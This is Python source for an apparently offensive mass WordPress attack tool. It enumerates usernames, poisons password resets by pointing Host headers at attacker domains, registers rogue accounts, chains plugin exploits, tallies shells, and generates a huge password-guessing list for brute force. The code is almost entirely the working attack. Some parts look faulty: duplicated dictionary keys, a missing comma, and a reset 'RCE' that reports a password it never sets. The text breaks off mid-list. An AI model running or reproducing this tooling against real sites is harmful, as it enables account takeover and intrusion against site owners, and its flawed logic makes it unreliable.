def extract_usernames(url, session):
    """Extraire les usernames WordPress automatiquement"""
    found_usernames = []
    
    try:
        # Méthode 1: Author ID Enumeration
        for author_id in range(1, 6):
            author_url = url + '/?author=' + str(author_id)
            resp = session.get(author_url, timeout=5, verify=False, allow_redirects=True)

            if resp.status_code == 200:
                final_url = resp.url
                patterns = [
                    r'/author/([^/]+)/',
                    r'/author/([^/]+)$',
                    r'/\?author_name=([^&]+)',
                    r'/archives/author/([^/]+)'
                ]

                for pattern in patterns:
                    match = re.search(pattern, final_url)
                    if match:
                        username = match.group(1)
                        if username and username not in found_usernames:
                            found_usernames.append(username)
                            break
        
        # Méthode 2: REST API Users Endpoint
        api_url = url + '/wp-json/wp/v2/users'
        resp = session.get(api_url, timeout=5, verify=False)
        
        if resp.status_code == 200:
            try:
                users = resp.json()
                for user in users[:5]:
                    if 'slug' in user:
                        username = user['slug']
                        if username and username not in found_usernames:
                            found_usernames.append(username)
            except:
                pass
                
    except:
        pass
        
    return found_usernames

def exploit_password_reset_rce(target_url: str, found_usernames=None) -> Optional[str]:
    """Exploit Password Reset Host Header Injection vulnerability avec vérification améliorée"""
    try:
        session = create_session()
        reset_password = "Password123!"
        
        if found_usernames:
            usernames_to_try = found_usernames
        else:
            extracted_usernames = extract_usernames(target_url, session)
            if extracted_usernames:
                usernames_to_try = extracted_usernames
                print(' -| ' + target_url + ' --> ' + Fore.GREEN + f'[Found {len(extracted_usernames)} usernames]')
            else:
                usernames_to_try = ['admin', 'administrator', 'root', 'webmaster']
        
        for username in usernames_to_try:
            print(' -| ' + target_url + ' --> ' + Fore.CYAN + f'[Attempting Host Header Injection for: {username}]')
            
            malicious_host = f"attacker-{random.randint(1000,9999)}.com"
            
            reset_data = {
                'user_login': username,
                'wp-submit': 'Get New Password',
                'redirect_to': '',
                'action': 'lostpassword'
            }
            
            headers = {
                'Host': malicious_host,
                'X-Forwarded-Host': malicious_host,
                'X-Forwarded-For': f'127.0.0.{random.randint(1, 255)}',
                'X-Real-IP': f'192.168.1.{random.randint(1, 255)}',
                'Client-IP': f'10.0.0.{random.randint(1, 255)}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': f'http://{malicious_host}',
                'Referer': f'http://{malicious_host}/wp-login.php'
            }
            
            try:
                response = session.post(
                    f"{target_url}/wp-login.php?action=lostpassword",
                    data=reset_data,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    
                    success_indicators = [
                        'check your email', 'confirmation email', 'password reset',
                        'email has been sent', 'reset link', 'check your e-mail'
                    ]
                    
                    error_indicators = [
                        'invalid username', 'username is not registered', 'could not find'
                    ]
                    
                    reset_successful = any(indicator in content_lower for indicator in success_indicators)
                    reset_error = any(indicator in content_lower for indicator in error_indicators)
                    
                    if reset_successful:
                        print(' -| ' + target_url + ' --> ' + Fore.GREEN + f'[Host Header Injection SUCCESS for: {username}]')
                        
                        with open('./readyTouse/host_header_injection.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{target_url} - Host: {malicious_host} - User: {username}\n")
                        
                        # Sauvegarder et vérifier les credentials
                        if save_successful_credentials(target_url, username, reset_password, "Password Reset Host Header Injection"):
                            return f"{target_url} - Password reset successful and verified: {username}:{reset_password}"
                        else:
                            return f"{target_url} - Password reset successful but login failed: {username}:{reset_password}"
                        
                    elif reset_error:
                        print(' -| ' + target_url + ' --> ' + Fore.RED + f'[User not found: {username}]')
                        break
                        
            except Exception as e:
                print(' -| ' + target_url + ' --> ' + Fore.RED + f'[Request failed: {str(e)[:50]}]')
                continue
        
        return None
        
    except Exception as e:
        print(f' -| Host Header Injection error: {str(e)[:50]}')
        return None

def exploit_password_reset_poisoning(base_url: str) -> Optional[str]:
    """Exploit Password Reset Poisoning via Headers"""
    try:
        session = create_session()
        headers = {
            "X-Forwarded-Host": "attacker.com",
            "Host": "attacker.com",
        }
        
        reset_data = {
            'user_login': 'admin'
        }
        
        r = session.post(
            f"{base_url}/wp-login.php?action=lostpassword",
            data=reset_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            # SAUVEGARDER LA VULNÉRABILITÉ
            with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                f.write(f"{base_url} - Password Reset Poisoning possible\n")
            return f"{base_url} - Password Reset Poisoning possible"
    except:
        pass
    return None

def exploit_wp_members_rce(target_url: str) -> Optional[str]:
    """WP-Members + Theme Editor RCE"""
    try:
        session = create_session()
        reset_data = {
            'action': 'wpmem_do_reset',
            'user': 'admin',
            'wpmem_reg_page': '1',
            'redirect_to': f'{target_url}/wp-admin/theme-editor.php?file=header.php'
        }
        
        response = session.post(f"{target_url}/wp-admin/admin-ajax.php", 
                               data=reset_data, verify=False, timeout=15)
        
        if 'success' in response.text.lower():
            # SAUVEGARDER LA VULNÉRABILITÉ
            with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target_url} - WP-Members reset vulnerable\n")
            return f"{target_url} - WP-Members reset vulnerable"
    except:
        pass
    return None

def exploit_reset_plugin_upload(target_url: str, username: str) -> Optional[str]:
    """Password Reset + Plugin Upload RCE"""
    try:
        session = create_session()
        reset_payload = {
            'user_login': username,
            'wp-submit': 'Get New Password'
        }
        
        session.post(f"{target_url}/wp-login.php?action=lostpassword", 
               data=reset_payload, timeout=10, verify=False)
        
        # SAUVEGARDER LA TENTATIVE
        with open('./readyTouse/reset_attempts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{target_url} - Reset attempted for {username}\n")
        return f"{target_url} - Plugin upload attempted after reset"
    except:
        pass
    return None

def exploit_registration_file_upload(target_url: str) -> Optional[str]:
    """Registration + File Upload RCE"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"hacker{random.randint(1000,9999)}@attacker.com"
        
        registration_data = {
            'user_login': username,
            'user_email': email,
            'pass1': 'Password123!',
            'pass2': 'Password123!',
            'role': 'author',
            'wp-submit': 'Register'
        }
        
        session.post(f"{target_url}/wp-login.php?action=register", 
               data=registration_data, timeout=10, verify=False)
        
        # SAUVEGARDER LA TENTATIVE
        with open('./readyTouse/registration_attempts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{target_url} - Registration attempted for {username}\n")
        return f"{target_url} - Registration attempted for: {username}"
    except:
        pass
    return None

# =============================================================================
# EXECUTION DES EXPLOITS WORDPRESS AMÉLIORÉE
# =============================================================================

def execute_all_wordpress_exploits(url, found_usernames=None):
    """Exécute tous les exploits WordPress disponibles avec vérifications améliorées"""
    print(' -| ' + url + ' --> ' + Fore.CYAN + '[Starting WordPress Exploits with Enhanced Verification...]')
    successful_exploits = []
    
    # Liste de tous les exploits disponibles
    exploits = [
        ("WP File Manager", check_wp_file_manager_vuln, exploit_wp_file_manager),
        ("Elementor", check_elementor_vuln, lambda u: exploit_elementor(u, "admin", "password")),
        ("Duplicator", None, exploit_duplicator),
        ("WPForms", None, exploit_wpforms),
        ("Wordfence", None, exploit_wordfence),
        ("ProfilePress", check_profilepress_vuln, exploit_profilepress),
        ("WP Registration", check_wp_registration_vuln, exploit_wp_registration),
        ("User Registration", check_user_registration_vuln, exploit_user_registration),
        ("RegistrationMagic", check_registrationmagic_vuln, exploit_registrationmagic),
        ("Ultimate Member", check_ultimate_member_vuln, exploit_ultimate_member),
        ("Profile Builder", check_profile_builder_vuln, exploit_profile_builder),
        ("Password Reset Poisoning", None, exploit_password_reset_poisoning),
        ("Password Reset RCE", None, lambda u: exploit_password_reset_rce(u, found_usernames)),
        ("WP Members RCE", None, exploit_wp_members_rce),
    ]
    
    for exploit_name, check_func, exploit_func in exploits:
        try:
            # Vérifier si la vulnérabilité existe
            if check_func:
                is_vuln, version = check_func(url)
                if not is_vuln:
                    continue
                print(' -| ' + url + ' --> ' + Fore.YELLOW + f'[{exploit_name} vulnerable - v{version}]')
            else:
                print(' -| ' + url + ' --> ' + Fore.YELLOW + f'[Trying {exploit_name}...]')
            
            # Exécuter l'exploit
            result = exploit_func(url)
            if result:
                successful_exploits.append((exploit_name, result))
                print(' -| ' + url + ' --> ' + Fore.GREEN + f'[{exploit_name} SUCCESS: {result}]')
                
                # Sauvegarder dans le fichier général des exploits
                with open('./readyTouse/wordpress_exploits.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{url} | {exploit_name} | {result}\n")
                    
        except Exception as e:
            print(' -| ' + url + ' --> ' + Fore.RED + f'[{exploit_name} error: {str(e)[:50]}]')
            continue
    
    # Résumé final
    if successful_exploits:
        print(' -| ' + url + ' --> ' + Fore.GREEN + f'[EXPLOITATION COMPLETE: {len(successful_exploits)} successful exploits]')
    else:
        print(' -| ' + url + ' --> ' + Fore.RED + '[No successful exploits]')
    
    return successful_exploits

class UltimateWPChecker:
    def __init__(self, threads=30, output_dir="./readyTouse"):
        self.threads = threads
        self.output_dir = output_dir
        self.timeout = 15
        self.max_retries = 2
        self.session = requests.Session()
        
        # Colors
        self.fr = Fore.RED
        self.fg = Fore.GREEN
        self.fw = Fore.WHITE
        self.fy = Fore.YELLOW
        self.fb = Fore.BLUE
        self.fm = Fore.MAGENTA
        self.fc = Fore.CYAN
        
        # Create output directory
        self.make_folders()
        
        # Statistics
        self.stats = {
            'total': 0,
            'wordpress': 0,
            'successful': 0,
            'shells': 0,
            'failed': 0,
            'usernames_found': 0,
            'locked': 0
        }
        
        # Lock for thread-safe file operations
        self.lock = threading.Lock()
        
        # Rate limiting
        self.last_request_time = 0
        self.min_request_interval = 0.5  # seconds between requests to same domain

    def extract_domain_info(self, url):
        """Extract domain information"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.replace('www.', '')
            name = domain.split('.')[0]
            words = re.findall(r'[a-zA-Z]+', name)
            numbers = re.findall(r'[0-9]+', name)
            tld = domain.split('.')[-1] if '.' in domain else ''
            parts = domain.split('.')
            subdomain = parts[0] if len(parts) > 2 else ''
            return {
                'domain': domain,
                'name': name,
                'words': words,
                'numbers': numbers,
                'tld': tld,
                'subdomain': subdomain,
                'parts': parts
            }
        except Exception as e:
            return None

    def generate_smart_passwords(self, domain_info):
        passwords = []
        if not domain_info:
            return passwords
        name = domain_info['name']
        tld = domain_info['tld']
        current_year = datetime.now().year
        current_month = datetime.now().month
        current_day = datetime.now().day
        current_month_name = datetime.now().strftime('%B')
        passwords.extend([
            name,
            name + '1',
            name + '123',
            name + '1234',
            name + '12345',
            name + '123456',
            name + '!',
            name + '2024',
            name + '2023',
            name + '2020',
            name + '.@12',
            name + str(current_year),
            name.capitalize() + '123',
            name + 'admin',
            'admin' + name
        ])
        passwords.extend([
            name + '1',
            name + '111',
            name + '11',
            name + '22',
            name + '00',
            name + '01',
            name + '321',
            name + '456',
            name + '789',
            name + '000',
            name + '999',
            name + '777',
            name + '666',
            name + '555',
            name + '101',
            name + '2020',
            name + '2021',
            name + '2022'
        ])
        passwords.extend([
            name + 'qwerty',
            name + 'qwe',
            name + 'asd',
            name + 'zxc',
            name + 'qaz',
            name + 'wsx',
            name + 'edc',
            name + '1q2w',
            name + '1qaz',
            name + 'asdf',
            name + 'zxcv'
        ])
        passwords.extend([
            name + '@',
            name + '+',
            name + '$',
            name + '@!',
            name + '!@#',
            name + '@#',
            name + '!!',
            name + '##',
            name + '$$',
            name + '***',
            name + '...',
            name + '_123',
            name + '-123',
            name + '.123'
        ])
        passwords.extend([
            name.upper(),
            name.capitalize(),
            name.upper() + '123',
            name.capitalize() + '1',
            name[:1].upper() + name[1:],
            name[:1].upper() + name[1:] + '123'
        ])
        passwords.extend([
            name[::-1],
            name[::-1] + '123',
            name + name[::-1]
        ])
        leet_name = name.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
        if leet_name != name:
            passwords.extend([leet_name, leet_name + '123'])
        if tld:
            passwords.extend([
                tld + '123',
                tld + '1234',
                tld + 'admin',
                'admin' + tld,
                tld + str(current_year),
                tld * 3
            ])
        country_patterns = {
            'com': ['password', 'admin123', 'letmein', 'welcome'],
            'org': ['nonprofit', 'charity', 'donate', 'help'],
            'edu': ['student', 'teacher', 'school', 'learn'],
            'gov': ['government', 'public', 'service', 'official'],
            'net': ['network', 'internet', 'online', 'web'],
            'biz': ['business', 'company', 'corporate', 'work'],

            'uk': ['london', 'england', 'british', 'united'],
            'de': ['deutsch', 'berlin', 'german', 'passwort'],
            'it': ['italia', 'roma', 'italian', 'password'],
            'ru': ['moscow', 'russia', 'parol', 'admin'],
            'cn': ['china', 'beijing', 'mima', 'admin'],
            'jp': ['japan', 'nihon', 'admin'],
            'br': ['brasil', 'senha', 'admin', 'acesso'],
            'in': ['india', 'delhi', 'mumbai', 'bharat', 'admin'],
            'au': ['australia', 'sydney', 'aussie', 'mate'],
            'ca': ['canada', 'toronto', 'maple', 'hockey'],
            'mx': ['mexico', 'ciudad', 'azteca', 'acceso'],
            'nl': ['holland', 'amsterdam', 'dutch', 'wachtwoord'],
            'se': ['sweden', 'stockholm', 'svensk', 'losenord'],
            'no': ['norway', 'oslo', 'norsk', 'passord'],
            'dk': ['denmark', 'copenhagen', 'dansk', 'kodeord'],
            'fi': ['finland', 'helsinki', 'suomi', 'salasana'],
            'pl': ['poland', 'warsaw', 'polska', 'haslo'],
            'gr': ['greece', 'athens', 'hellas', 'kodikos'],
            'tr': ['turkey', 'istanbul', 'turkiye', 'sifre'],
            'sa': ['saudi', 'riyadh', 'arabic', 'makhfi'],
            'ae': ['dubai', 'emirates', 'uae', 'admin'],
            'eg': ['egypt', 'cairo', 'masr', 'admin'],
            'za': ['africa', 'capetown', 'south', 'admin'],
            'ng': ['nigeria', 'lagos', 'naija', 'admin'],
            'ke': ['kenya', 'nairobi', 'safari', 'admin'],

            'fr': ['france', 'paris', 'monaco', 'lyon', 'marseille', 'bonjour'],
            'de': ['germany', 'berlin', 'munich', 'hamburg', 'guten', 'tag'],
            'it': ['italy', 'rome', 'milan', 'venice', 'ciao', 'bella'],
            'es': ['spain', 'madrid', 'barcelona', 'valencia', 'hola', 'amigo'],
            'uk': ['london', 'britain', 'england', 'scotland', 'hello', 'cheers'],
            'us': ['usa', 'america', 'newyork', 'california', 'texas', 'hello'],
            'ca': ['canada', 'toronto', 'vancouver', 'montreal', 'hello', 'sorry'],
            'in': ['india', 'delhi', 'mumbai', 'bangalore', 'namaste', 'hello'],
            'br': ['brazil', 'brasil', 'saoPaulo', 'rio', 'ola', 'obrigado'],
            'ru': ['russia', 'moscow', 'spb', 'privet', 'poka'],
            'cn': ['china', 'beijing', 'shanghai', 'nihao', 'hello'],
            'jp': ['japan', 'tokyo', 'osaka', 'konnichiwa', 'hello'],
            'com': ['password', 'admin123', 'letmein', 'welcome'],
            'org': ['nonprofit', 'charity', 'donate', 'help'],
            'edu': ['student', 'teacher', 'school', 'learn'],
            'gov': ['government', 'public', 'service', 'official'],
            'net': ['network', 'internet', 'online', 'web'],
            'biz': ['business', 'company', 'corporate', 'work'],

            'uk': ['london', 'england', 'british', 'united'],
            'de': ['deutsch', 'berlin', 'german', 'passwort'],
            'it': ['italia', 'roma', 'italian', 'password'],
            'ru': ['moscow', 'russia', 'parol', 'admin'],
            'cn': ['china', 'beijing', 'mima', 'admin'],
            'jp': ['japan', 'nihon', 'admin'],
            'br': ['brasil', 'senha', 'admin', 'acesso'],
            'in': ['india', 'delhi', 'mumbai', 'bharat', 'admin'],
            'au': ['australia', 'sydney', 'aussie', 'mate'],
            'ca': ['canada', 'toronto', 'maple', 'hockey'],
            'mx': ['mexico', 'ciudad', 'azteca', 'acceso'],
            'nl': ['holland', 'amsterdam', 'dutch', 'wachtwoord'],
            'se': ['sweden', 'stockholm', 'svensk', 'losenord'],
            'no': ['norway', 'oslo', 'norsk', 'passord'],
            'dk': ['denmark', 'copenhagen', 'dansk', 'kodeord'],
            'fi': ['finland', 'helsinki', 'suomi', 'salasana'],
            'pl': ['poland', 'warsaw', 'polska', 'haslo'],
            'gr': ['greece', 'athens', 'hellas', 'kodikos'],
            'tr': ['turkey', 'istanbul', 'turkiye', 'sifre'],
            'sa': ['saudi', 'riyadh', 'arabic', 'makhfi'],
            'ae': ['dubai', 'emirates', 'uae', 'admin'],
            'eg': ['egypt', 'cairo', 'masr', 'admin'],
            'za': ['africa', 'capetown', 'south', 'admin'],
            'ng': ['nigeria', 'lagos', 'naija', 'admin'],
            'ke': ['kenya', 'nairobi', 'safari', 'admin']
        }
        if tld in country_patterns:
            passwords.extend(country_patterns[tld])
            for p in country_patterns[tld]:
                passwords.extend([p + '123', p + '1234'])
        if domain_info['subdomain']:
            sub = domain_info['subdomain']
            passwords.extend([
                sub,
                sub + '123',
                sub + '1234',
                sub + 'admin',
                'admin' + sub
            ])
        common = [
            'admin', '123456', 'password', 'admin123', '12345678',
            'demo', 'test', '123456789', '12345', 'administrator',
            'joomla', 'joomla123', 'root', 'pass', 'qwerty',
            'letmein', 'welcome', '111111', '000000', 'abc123',
            'password1', 'admin1234', 'changeme', 'master', 'secret',
            'qwertyuiop', 'asdfghjkl', 'zxcvbnm', 'qazwsx', 'qazwsxedc',
            '1qaz2wsx', 'q1w2e3r4', '1q2w3e4r', 'qweasd', 'qweasdzxc',
            '123123', '112233', '121212', '123321', '123abc',
            '654321', '666666', '777777', '888888', '999999',
            '000000', '111222', '123000', '123qwe', 'qwe123',
            '012345', '123456', '234567', '345678', '456789',
            '987654', '876543', '765432', '654321', '543210',
            'dragon', 'monkey', 'football', 'baseball', 'superman',
            'batman', 'michael', 'shadow', 'master', 'trustno1',
            'default', 'guest', 'user', 'temp', 'temporary',
            'backup', 'system', 'sys', 'network', 'lan',
            'iloveyou', 'loveme', 'fuckyou', 'freedom', 'success',
            'winner', 'blessed', 'faith', 'hope', 'grace'
        ]
        passwords.extend(common)
        for year in range(current_year - 5, current_year + 1):
            passwords.extend([
                str(year),
                'admin' + str(year),
                'password' + str(year),
                str(year) + 'admin',
                str(year)[2:],  
                'admin' + str(year)[2:]
            ])
        passwords.extend([
            f'{current_month:02d}{current_year}',
            f'{current_year}{current_month:02d}',
            f'{current_day:02d}{current_month:02d}{current_year}',
            f'{current_year}{current_month:02d}{current_day:02d}'
        ])
        passwords.extend([
            '0123456789',
            '1234567890',
            '0000000000',
            '1111111111',
            '1234567',
            '7654321',
            '123456',
            '0987654321'
        ])
        country_passwords = [
            'Pakistan', 'India', 'Indonesia', 'Bangladesh', 'Philippines',
            'Thailand', 'Vietnam', 'Malaysia', 'Singapore', 'Myanmar',
            'Cambodia', 'Laos', 'Nepal', 'SriLanka', 'Afghanistan',
            'China', 'Japan', 'Korea', 'Taiwan', 'HongKong',
            'Saudi', 'UAE', 'Egypt', 'Jordan', 'Lebanon',
            'Syria', 'Iraq', 'Iran', 'Turkey', 'Israel',
            'Palestine', 'Kuwait', 'Qatar', 'Bahrain', 'Oman',
            'Yemen', 'Morocco', 'Algeria', 'Tunisia', 'Libya',
            'Nigeria', 'SouthAfrica', 'Kenya', 'Ethiopia', 'Ghana',
            'Tanzania', 'Uganda', 'Zimbabwe', 'Zambia', 'Rwanda',
            'Somalia', 'Sudan', 'Senegal', 'Mali', 'Niger',
            'Germany', 'France', 'Italy', 'Spain', 'Portugal',
            'Netherlands', 'Belgium', 'Switzerland', 'Austria', 'Poland',
            'Romania', 'Greece', 'Serbia', 'Croatia', 'Bulgaria',
            'Ukraine', 'Russia', 'Belarus', 'Czech', 'Hungary',
            'USA', 'America', 'Canada', 'Mexico', 'Brazil',
            'Argentina', 'Chile', 'Colombia', 'Peru', 'Venezuela',
            'Ecuador', 'Bolivia', 'Uruguay', 'Paraguay', 'Guatemala',
            'Australia', 'NewZealand', 'Fiji', 'PNG', 'Samoa'
        ]
        for country in country_passwords:
            passwords.extend([
                country + '@123',
                country + '@1234',
                country + '@12345',
                country + '@123456',
                country + '@2024',
                country + '@2023',
                country + '@2022',
                country + '@2021',
                country + '@2020',
                country + '@123',
                country + '@' + str(current_year),
                country + '@1',
                country + '@12',
                country + '@111',
                country + '@000',
                country + '@786',
                country + '@313',
                country + '@420',
                country + '@321',
                country + '@999',
                country + '@777',
                country + '@666',
                country + '@555',
                country + '@101',
                country + '@100',
                country.lower() + '@123',
                country.upper() + '@123'
            ])

        domain_patterns = [
            name, name.upper(), name.capitalize(), name.lower(),
            name + '123', name + '1234', name + '12345', name + '123456',
            name + '!', name + '@', name + '#', name + '$', name + '%',
            name + '2024', name + '2023', name + str(current_year),
            name + 'admin', 'admin' + name, name + 'user', 'user' + name,
            name + 'pass', 'pass' + name, name + 'wordpress', 'wp' + name,
            name + 'joomla', 'joomla' + name,
        ]
        passwords.extend(domain_patterns)

        nationality_patterns = [
            'Pakistani@123', 'Indian@123', 'Indonesian@123', 'American@123',
            'British@123', 'Canadian@123', 'Australian@123', 'German@123',
            'French@123', 'Italian@123', 'Spanish@123', 'Russian@123',
            'Chinese@123', 'Japanese@123', 'Korean@123', 'Arab@123',
            'African@123', 'European@123', 'Asian@123', 'Latino@123'
        ]

        passwords.extend(nationality_patterns)
        passwords.extend([
            'jesus', 'jesus123', 'christ', 'blessed', 'amen',
            'god123', 'lord123', 'faith123', 'grace123', 'cross',
            'allah', 'allah123', 'bismillah', 'muhammad', 'islam',
            'muslim', 'quran', 'makkah', 'madinah', 'ramadan',
            'krishna', 'shiva', 'ganesh', 'rama', 'hanuman',
            'om123', 'namaste', 'india123', 'bharat', 'hindu',
            'buddha', 'dharma', 'karma', 'nirvana', 'zen',
            'blessed1', 'peace', 'love', 'hope', 'faith'
        ])
        major_cities = [
            'Delhi', 'Mumbai', 'Bangalore', 'Kolkata', 'Chennai',
            'Karachi', 'Lahore', 'Islamabad', 'Dhaka', 'Jakarta',
            'Manila', 'Bangkok', 'KualaLumpur', 'Singapore', 'HoChiMinh',
            'Beijing', 'Shanghai', 'Tokyo', 'Seoul', 'Taipei',
            'Dubai', 'AbuDhabi', 'Riyadh', 'Jeddah', 'Cairo',
            'Alexandria', 'Amman', 'Beirut', 'Damascus', 'Baghdad',
            'Tehran', 'Istanbul', 'Ankara', 'TelAviv', 'Jerusalem',
            'Lagos', 'Abuja', 'CapeTown', 'Johannesburg', 'Nairobi',
            'AddisAbaba', 'Accra', 'DarEsSalaam', 'Kampala', 'Harare',
            'London', 'Paris', 'Berlin', 'Madrid', 'Rome',
            'Amsterdam', 'Brussels', 'Vienna', 'Warsaw', 'Bucharest',
            'Athens', 'Belgrade', 'Zagreb', 'Sofia', 'Kiev',
            'Moscow', 'StPetersburg', 'Prague', 'Budapest', 'Lisbon',
            'NewYork', 'LosAngeles', 'Chicago', 'Houston', 'Phoenix',
            'Toronto', 'Vancouver', 'Montreal', 'MexicoCity', 'SaoPaulo',
            'RioDeJaneiro', 'BuenosAires', 'Santiago', 'Lima', 'Bogota',
            'Sydney', 'Melbourne', 'Brisbane', 'Perth', 'Auckland'
        ]
        for city in major_cities:
            passwords.extend([
                city + '@123',
                city + '@1234',
                city.lower() + '@123',
                city + str(current_year)
            ])
        passwords.extend([
            'barcelona', 'realmadrid', 'manchester', 'liverpool', 'chelsea',
            'arsenal', 'juventus', 'milan', 'inter', 'bayern',
            'dortmund', 'psg', 'ajax', 'porto', 'benfica'
        ])
        brand_passwords = [
            'Google@123', 'Facebook@123', 'Apple@123', 'Microsoft@123',
            'Amazon@123', 'Netflix@123', 'Twitter@123', 'Instagram@123',
            'WhatsApp@123', 'YouTube@123', 'LinkedIn@123', 'TikTok@123',
            'Samsung@123', 'Nokia@123', 'Sony@123', 'Dell@123',
            'HP@123', 'IBM@123', 'Oracle@123', 'Cisco@123',
            'PTCL@123', 'Zong@123', 'Jazz@123', 'Ufone@123',  
            'Airtel@123', 'Jio@123', 'BSNL@123', 'Vodafone@123',  
            'Telkom@123', 'Indosat@123', 'XL@123',
            'Globe@123', 'Smart@123', 'PLDT@123',
            'Etisalat@123', 'Du@123', 'STC@123', 'Mobily@123',
            'MTN@123', 'Glo@123', '9mobile@123',
            'Safaricom@123', 'Orange@123', 'Vivo@123'
        ]
        passwords.extend(brand_passwords)
        profession_passwords = [
            'Engineer@123', 'Doctor@123', 'Teacher@123', 'Student@123',
            'Manager@123', 'Director@123', 'CEO@123', 'Boss@123',
            'Admin@123', 'User@123', 'Guest@123', 'Staff@123',
            'Employee@123', 'Worker@123', 'Developer@123', 'Designer@123'
        ]
        passwords.extend(profession_passwords)
        current_season = 'winter' if current_month in [12, 1, 2] else 'spring' if current_month in [3, 4, 5] else 'summer' if current_month in [6, 7, 8] else 'autumn'
        passwords.extend([
            current_month_name,
            current_month_name + str(current_year),
            current_season,
            current_season + str(current_year)
        ])

        base_combinations = [
            f"{name}@{current_year}", f"{name}#{current_year}", 
            f"{name}${current_year}", f"{name}!{current_year}",
            f"admin@{name}", f"admin#{name}", f"{name}@admin",
            f"wp@{name}", f"{name}@wp", f"wordpress@{name}",
            f"joomla@{name}", f"{name}@joomla",
            f"{name}@123", f"{name}#123", f"{name}$123",
            f"{name}@2024", f"{name}#2024", f"{name}$2024",
            f"Welcome@{name}", f"Hello@{name}", f"Test@{name}",
            f"{name}@Welcome", f"{name}@Hello", f"{name}@Test",
        ]
        
        passwords.extend(base_combinations)

        tld_combinations = [
                f"admin@{tld}", f"admin#{tld}", f"admin@{tld}123",
                f"{name}@{tld}", f"{tld}@{name}", f"{tld}{name}",
                f"{name}{tld}", f"{tld}123", f"{tld}2024",
            ]

        passwords.extend(tld_combinations)


         # Patterns numériques
        numeric_patterns = [
            '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890',
            '111', '1111', '11111', '111111', '1111111', '11111111',
            '000', '0000', '00000', '000000', '0000000', '00000000',
            '1212', '1122', '123123', '123321', '112233', '111222',
            '987654', '987654321', '123654', '123abc', 'abc123',
            '100', '200', '300', '400', '500', '600', '700', '800', '900',
            '101', '202', '303', '404', '505', '606', '707', '808', '909',
        ]
        
        # Patterns clavier
        keyboard_patterns = [
            'qwerty', 'qwertyuiop', 'qwertz', 'azerty', 'qazwsx', 'wsxedc', 'edcrfv',
            'asdfgh', 'zxcvbn', 'asdfghjkl', 'zxcvbnm', '1qaz2wsx', '1q2w3e4r',
            'qweasd', 'qweasdzxc', 'zaq12wsx', '!qaz2wsx', '1qaz@wsx',
            'qwer1234', 'asdf1234', 'zxcv1234', 'qazwsxedc', '123qwe',
        ]
        
        passwords.extend(numeric_patterns)
        passwords.extend(keyboard_patterns)


         # Mots de passe d'urgence/common
        emergency_passwords = [
            'admin', 'admin2017', 'password', '123456', 'admin123', '12345678','qwe123', 'psw2018',
            'password123', 'admin@123', 'Admin@123', 'P@ssw0rd',
            '123456789', '12345', '1234567890', 'qwerty', 'abc123',
            '111111', '123123', 'admin1234', 'letmein', 'welcome',
            'monkey', 'password1', '1234', 'superman', 'azerty',
            'sunshine', 'princess', 'qwertyuiop', 'passw0rd',
            'master', 'hello', 'freedom', 'whatever', 'qazwsx',
            'trustno1', 'dragon', 'baseball', 'football', 'jordan',
            'harley', 'ranger', 'iwantu', 'mustang', 'shadow',
            'ashley', 'michael', 'daniel', 'andrew', 'charlie',
            'jessica', 'password123', '123456a', '123456b',
            '123456c', '123456d', '123456e', 'admin123456',
            'pass123', 'pass1234', 'pass12345', 'password1',
            'Password', 'PASSWORD', 'p@ssword', 'p@ssw0rd',
            'P@ssword', 'P@ssw0rd', 'P@SSW0RD', 'pa$$word',
            'Pa$$word', 'PA$$WORD', 'pass@123', 'Pass@123',
            'PASS@123', 'admin@123', 'Admin@123', 'ADMIN@123',
            'demo', 'test', 'test123', 'temp', 'temp123',
            'guest', 'guest123', 'user', 'user123', 'owner',
            'owner123', 'root', 'root123', 'administrator',
            'manager', 'webmaster', 'sysadmin', 'operator'
            'admin', '123456', 'password', 'admin123', '12345678',
            'demo', 'test', '123456789', '12345', 'administrator',
            'joomla', 'joomla123', 'root', 'pass', 'qwerty',
            'letmein', 'admin123', 'welcome', 'monkey', 'sunshine',
            'password1', '123456789', 'football', 'iloveyou', 'starwars', 'dragon',
            'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1',
            '654321', 'jordan23', 'harley', 'password123', '1q2w3e4r', '555555',
            'loveme', 'hello123', 'zaq1zaq1', 'abc123', '123123', 'donald', 'batman',
            'access', 'shadow', 'superman', 'qwerty123', 'michael', 'mustang', 'jennifer',
            '111111', '2000', 'jordan', 'super123', '123456a', 'andrew', 'matthew',
            'golfer', 'buster', 'nicole', 'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom1', '7777777', 'pass', 'maggie', '159753',
            'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer',
            'love', 'ashley', '6969', 'nicole1', 'chelsea', 'biteme', 'matthew1',
            'access14', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor',
            'matrix', 'minecraft', 'buster1', 'hello1', 'charlie', '1234567', '1234567890',
            '888888', '123123123', 'flower', 'password2', 'soccer', 'purple', 'george',
            'chicken', 'samsung', 'anthony', 'andrea', 'killer', 'jessica1', 'peanut',
            'jordan1', 'justin', 'liverpool', 'daniel', 'secret', 'asdfghjkl', '123654',
            'orange', 'computer', 'michelle', 'mercedes', 'banana', 'blink182', 'qwertyuiop',
            '123321', 'snoopy', 'baseball', 'whatever1', 'creative', 'patrick', 'internet',
            'scooter', 'muffin', '123abc', 'madison', 'hockey', 'arsenal', 'dragon1',
            'maverick', 'cookie', 'ashley1', 'bandit', 'knight', 'ginger1', 'shannon',
            'william', 'startrek', 'phantom', 'camaro', 'boomer', 'coffee', 'falcon',
            'winner', 'smith', 'sierra', 'runner', 'butterfly', 'test123', 'merlin',
